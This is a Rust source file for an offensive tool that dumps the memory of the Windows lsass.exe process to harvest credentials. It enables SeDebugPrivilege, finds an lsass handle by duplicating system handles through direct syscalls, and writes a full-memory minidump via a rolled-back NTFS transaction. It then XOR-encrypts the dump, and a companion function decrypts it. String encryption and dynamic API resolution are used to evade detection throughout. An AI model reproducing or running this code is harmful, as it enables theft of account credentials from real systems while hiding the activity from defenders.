//#![crate_type = "cdylib"]
//cargo rustc -- --crate-type cdylib 
#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use litcrypt::lc;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
use core::panic;
use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
use bindings::Windows::Win32::{Foundation::{BOOL, HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileSize, MapViewOfFile, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PAGE_READONLY, PVOID, QueryFullProcessImageNameW, RollbackTransactio, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, UnmapViewOfFile};


// #[no_mangle]
pub fn dump(key: &str) {

    unsafe 
    {
        let privilege: u32 = 20; 
        let enable: u8 = 1; 
        let current_thread: u8 = 0;
        let enabled: *mut u8 = std::mem::transmute(&u8::default()); 
       
        //Enable SeDebugPrivilee
        let r = dinvoke::rtl_adjust_privilege(privilege,enable,current_thread,enabled);

        if r != 0 
        {
            panic!("{}",&lc!("[x] SeDebugPrivilege could not be enabled."));
        }
        else 
        {
            println!("{}", &lc!("[+] SeDebugPrivilege successfully enabled."));
        }

        let shi: *mut SYSTEM_HANDLE_INFORMATION;
        let mut ptr: PVOID;
        let mut buffer;
        let mut bytes = 2u32;
        let mut c = 0;

        loop
        { 
            buffer =  vec![0u8; bytes as usize];
            let ret: Option<i32>;
            let fun: NtQuerySystemInformation;
            ptr = std::mem::transmute(buffer.as_ptr());
            let bytes_ptr: *mut u32 = std::mem::transmute(&bytes);
            
            // Query the system looking for handles information
            dinvoke::execute_syscall!(&lc!("NtQuerySystemInformation"),fun,ret,16,ptr,bytes,bytes_ptr);

            match ret {
                Some(x) => 
                    if x != 0 
                    {
                        bytes = *bytes_ptr;
                    }
                    else
                    {
                        shi = std::mem::transmute(ptr);
                        break;
                    },
                None => { panic!("{}", &lc!("[x] Call to NtQuerySystemInformation failed."));}
            }

            c = c + 1;

            if c > 20
            {
                panic!("{}", &lc!("[x] Timeout. Call to NtQuerySystemInformation failed."));
            }
        }     
        
        println!("{}{}{}",&lc!("[+] Retrieved "), (*shi).number_of_handles, &lc!(" handles. Starting analysis..."));
        let mut shtei: *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO = std::mem::transmute(&(*shi).handles);
        for x in 0..(*shi).number_of_handles 
        {

            if (*shtei).process_id > 4
            {
                let function_ptr: NtOpenProcess;
                let handle_ptr: *mut HANDLE = std::mem::transmute(&HANDLE::default());
                let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&OBJECT_ATTRIBUTES::default());
                let client_id = CLIENT_ID {UniqueProcess: HANDLE{0:(*shtei).process_id as isize}, UniqueThread: HANDLE::default()};
                let client_id: *mut CLIENT_ID = std::mem::transmute(&client_id);
                let ret: Option<i32>; 
                // PROCESS_DUP_HANDLE as access right
                dinvoke::execute_syscall!(
                    "NtOpenProcess",
                    function_ptr,
                    ret,
                    handle_ptr,
                    0x0040,
                    object_attributes,
                    client_id
                );

                let handle;

                match ret {
                    Some(x) =>
                    {
                        if x == 0
                        {
                            handle = *handle_ptr;
                        }
                        else 
                        {
                            shtei = shtei.add(1);
                            continue;
                        }
                    },
                    None => {shtei = shtei.add(1); continue},
                }


                if handle.0 != 0 && handle.0 != -1
                {
                    let func_ptr: NtDuplicateObject;
                    let target = HANDLE {0: (*shtei).handle_value as isize};
                    let dup_handle: *mut HANDLE = std::mem::transmute(&HANDLE::default());
                    let ret: Option<i32>; 
                    // Duplicate handle in order to manipulate it
                    dinvoke::execute_syscall!(
                        &lc!("NtDuplicateObject"),
                        func_ptr,
                        ret,
                        handle,
                        target,
                        GetCurrentProcess(),
                        dup_handle,
                        0x0400|0x0010, // PROCESS_QUERY_INFORMATION & PROCESS_VM_READ 
                        0,
                        0
                    );

                    match ret 
                    {
                        Some(x) =>
                            if x != 0 
                            {
                                shtei = shtei.add(1);
                                continue;
                            }
                        None => {shtei = shtei.add(1); continue},
                    }
                    

                    let poti = PUBLIC_OBJECT_TYPE_INFORMATION::default();
                    let poti_ptr: PVOID = std::mem::transmute(&poti);
                    let func_ptr: NtQueryObject;
                    let _ret: Option<i32>; 
                    let ret_lenght: *mut u32 = std::mem::transmute(&u32::default());

                    // We obtain information about the handle. Two calls to NtQueryObject are required in order to make it work.
                    dinvoke::execute_syscall!(
                        &lc!("NtQueryObject"),
                        func_ptr,
                        _ret,
                        *dup_handle,
                        2,
                        poti_ptr,
                        size_of::<PUBLIC_OBJECT_TYPE_INFORMATION>() as u32,
                        ret_lenght
                    );


                    let ret: Option<i32>;
                    let func_ptr: NtQueryObject;
                    let buffer = vec![0u8; *ret_lenght as usize];
                    let poti_ptr: PVOID = std::mem::transmute(buffer.as_ptr());
                    dinvoke::execute_syscall!(
                        &lc!("NtQueryObject"),
                        func_ptr,
                        ret,
                        *dup_handle,
                        2,
                        poti_ptr,
                        *ret_lenght,
                        ret_lenght
                    );

                    match ret 
                    {
                        Some(x) =>
                            if x != 0 
                            {
                                shtei = shtei.add(1);
                                continue;
                            }
                        None => {shtei = shtei.add(1); continue},
                    }

                    let poti_ptr: *mut PUBLIC_OBJECT_TYPE_INFORMATION = std::mem::transmute(poti_ptr);
                    let poti = *poti_ptr;
                    let mut type_name: String = "".to_string();
                    let mut buffer: *mut u8 = poti.TypeName.Buffer.0 as *mut u8;
                    for _i in 0..poti.TypeName.Length
                    {
                        if *buffer as char != '\0'
                        {
                            type_name.push(*buffer as char);
                        }
                        buffer = buffer.add(1);

                    }

                
                    // We have a process handle
                    if type_name.to_lowercase() == "process"
                    {
                        let kernel32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));

                        let len = 200usize; // I dont really think it exists a process image name longer than 200 characters
                        let buffer = vec![0u8; len];
                        let buffer: *mut u16 = std::mem::transmute(buffer.as_ptr());
                        let ret: Option<i32>; 
                        let func: QueryFullProcessImageNameW;
                        let ret_len: *mut u32 = std::mem::transmute(&len);
                        // We retrieve the full name of the executable image for the process owner of the duplicated handle
                        dinvoke::dynamic_invoke!(
                            kernel32,
                            &lc!("QueryFullProcessImageNameW"),
                            func,
                            ret,
                            *dup_handle,
                            0,
                            buffer,
                            ret_len
                        );

                        match ret {
                            Some(z) =>
                                if z == 0 
                                {
                                    shtei = shtei.add(1);
                                    continue;
                                }
                            None => {shtei = shtei.add(1); continue;},
                        }

                        let mut image_name: String = "".to_string();
                        let mut buffer: *mut u8 = std::mem::transmute(buffer);
                        for _i in 0..(*ret_len) * 2 // Each char is followed by \0. Lovely LPWSTR...
                        {
                            if *buffer as char != '\0' 
                            {
                                image_name.push(*buffer as char);
                            }
                            buffer = buffer.add(1);

                        }

                        // We have a valid process handled
                        if image_name.contains(&lc!("lsass.exe"))
                        {                         
                            let ktmv = dinvoke::load_library_a(&lc!("KtmW32.dll")).unwrap();
                            let func: CreateTransaction;
                            let ret: Option<HANDLE>;
                            let description = "\0\0".as_ptr() as *mut u16;
                            dinvoke::dynamic_invoke!(
                                ktmv,
                                &lc!("CreateTransaction"),
                                func,
                                ret,
                                ptr::null_mut(),
                                ptr::null_mut(),
                                0,
                                0,
                                0,
                                0,
                                description
                            );

                            let transaction_handle: HANDLE;

                            match ret {
                                Some(z) =>
                                    if z.0 == -1 
                                    {
                                        shtei = shtei.add(1);
                                        continue;
                                    }
                                    else
                                    {
                                        transaction_handle = z;
                                    }
                                None => {shtei = shtei.add(1); continue;},
                            }

                           /* if transaction_handle.0 == -1
                            {
                                let func: GetLastError;
                                let ret: Option<u32>;
                                dinvoke::dynamic_invoke!(
                                    kernel32,
                                    &lc!("GetLastError"),
                                    func,
                                    ret,
                                );

                                println!("Error: {}", ret.unwrap());
                                break;
                            }*/

                            let func: CreateFileTransactedA;
                            let ret: Option<HANDLE>;
                            let mini: *const u32 = std::mem::transmute(&0xffff);
                            let rand_string: String = thread_rng()
                            .sample_iter(&Alphanumeric)
                            .take(7)
                            .map(char::from)
                            .collect();

                            let file_name = format!(".\\{}{}", rand_string, ".log");
                            let file_name = file_name.as_ptr() as *mut u8;
                            dinvoke::dynamic_invoke!(
                                kernel32,
                                &lc!("CreateFileTransactedW"),
                                func,
                                ret,
                                file_name,
                                0x80000000 | 0x40000000,
                                0x00000002,
                                ptr::null(),
                                0x00000001, 
                                0x100 | 0x04000000,
                                HANDLE::default(),
                                transaction_handle,
                                mini,
                                ptr::null_mut()
                            );

                            let transacted_file_handle: HANDLE;

                            match ret {
                                Some(z) =>
                                    if z.0 == -1 
                                    {
                                        shtei = shtei.add(1);
                                        continue;
                                    }
                                    else
                                    {
                                        transacted_file_handle = z;
                                    }
                                None => {shtei = shtei.add(1); continue;},
                            }

                            let dbg = dinvoke::load_library_a(&lc!("Dbgcore.dll")).unwrap();
                            let func: MiniDumpWriteDump;
                            let ret: Option<i32>;
                            // We use the duplicated handle to dump the process memory
                            dinvoke::dynamic_invoke!(
                                dbg,
                                &lc!("MiniDumpWriteDump"),
                                func,
                                ret,
                                *dup_handle,
                                0, // Process Id does not seem to be needed 
                                transacted_file_handle,
                                0x00000002, // MiniDumpWithFullMemory
                                ptr::null_mut(),
                                ptr::null_mut(),
                                ptr::null_mut()
                            );

                            match ret {
                                Some(x) => 
                                    if x == 1 
                                    {
                                        println!("{}",&lc!("[!] Lsass dump successfully created!"));
                                        
                                        let func: GetFileSize;
                                        let ret: Option<u32>;
                                        dinvoke::dynamic_invoke!(
                                            kernel32,
                                            &lc!("GetFileSize"),
                                            func,
                                            ret,
                                            transacted_file_handle,
                                            ptr::null_mut()
                                        );

                                        let dump_size = ret.unwrap();

                                        let func: CreateFileMapping;
                                        let ret: Option<HANDLE>;
                                        dinvoke::dynamic_invoke!(
                                            kernel32,
                                            &lc!("CreateFileMappingW"),
                                            func,
                                            ret,
                                            transacted_file_handle,
                                            ptr::null(),
                                            PAGE_READONLY,
                                            0,
                                            0,
                                            ptr::null_mut()
                                        );


                                        let map_handle: HANDLE;

                                        match ret {
                                            Some(z) =>
                                                if z.0 == -1 
                                                {
                                                    shtei = shtei.add(1);
                                                    continue;
                                                }
                                                else
                                                {
                                                    map_handle = z;
                                                }
                                            None => {shtei = shtei.add(1); continue;},
                                        }

                                        let func: MapViewOfFile; 
                                        let ret: Option<PVOID>;

                                        dinvoke::dynamic_invoke!(
                                            kernel32,
                                            &lc!("MapViewOfFile"),
                                            func,
                                            ret,
                                            map_handle,
                                            4, // FILE_MAP_READ
                                            0,
                                            0,
                                            0
                                        );

                                        let mut view_ptr = ret.unwrap() as *mut u8;

                                        let mut key_ptr = key.as_ptr();
                                        let mut xor_key: u8 = *key_ptr;
                                        key_ptr = key_ptr.add(1);
                                        while *key_ptr != '\0' as u8
                                        {
                                            xor_key = xor_key ^ *key_ptr;
                                            key_ptr = key_ptr.add(1);
                                        }


                                        let mut view_xor: Vec<u8> = vec![];
                                        for _i in 0..dump_size
                                        {
                                            view_xor.push(*view_ptr ^ xor_key);
                                            view_ptr = view_ptr.add(1);
                                        }


                                        let rand_string: String = thread_rng()
                                            .sample_iter(&Alphanumeric)
                                            .take(7)
                                            .map(char::from)
                                            .collect();

                                        let file_name = format!("{}{}", rand_string, ".txt");
                                        let mut file = std::fs::File::create(&file_name).unwrap();
                                        let _r = file.write(&view_xor).unwrap();

                                        println!("{} {}.", &lc!("[+] Memory dump written to file"), file_name.as_str());

                                        let func: UnmapViewOfFile;
                                        let ret2: Option<BOOL>;
                                        dinvoke::dynamic_invoke!(
                                            kernel32,
                                            &lc!("UnmapViewOfFile"),
                                            func,
                                            ret2,
                                            ret.unwrap()
                                        );

                                        if ret2.unwrap().as_bool() == true
                                        {
                                            println!("{}", &lc!("[+] Successfully unmapped view of file."));
                                        }


                                        let func: RollbackTransactio;
                                        let ret: Option<BOOL>;
                                        dinvoke::dynamic_invoke!(
                                            ktmv,
                                            &lc!("RollbackTransaction"),
                                            func,
                                            ret,
                                            transaction_handle
                                        );

                                        if ret.unwrap().as_bool() == true 
                                        {
                                            println!("{}",&lc!("[+] Transaction successfully rollbacked."));
                                        }

                                        let _r = dinvoke::close_handle(*dup_handle).unwrap();
                                        let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                        let _r = dinvoke::close_handle(map_handle).unwrap();
                                        let _r = dinvoke::close_handle(transaction_handle).unwrap();

                                        break;
                                    },
                                None => {},
                            }
                            

                        }
                    }
                }
            }

            shtei = shtei.add(1);

            if x == (*shi).number_of_handles - 1
            {
                println!("{}", &lc!("[x] Execution failed. Exiting."));
            }
        }            
    }
}


pub fn decrypt (file_path: &str, key: &str, output_file: &str) 
{
    unsafe{

        let mut file = File::open(file_path).expect("[x] Error opening input file.");
        let metadata = fs::metadata(file_path).unwrap();
        let mut buffer = vec![];
        file.read_to_end(&mut buffer).unwrap();


        let mut buffer_ptr = buffer.as_ptr();

        let mut key_ptr = key.as_ptr();
        let mut xor_key: u8 = *key_ptr;
        key_ptr = key_ptr.add(1);
        while *key_ptr != '\0' as u8
        {
            xor_key = xor_key ^ *key_ptr;
            key_ptr = key_ptr.add(1);
        }

        let mut file_content: Vec<u8> = vec![];
        for _i in 0..metadata.len()
        {
            file_content.push(*buffer_ptr ^ xor_key);
            buffer_ptr = buffer_ptr.add(1);
        }

        let mut output = std::fs::File::create(output_file).unwrap();
        let _r = output.write_all(&file_content).unwrap();
    }

    println!("{}", &lc!("[+] Successfully unencrypted minidump file."))

}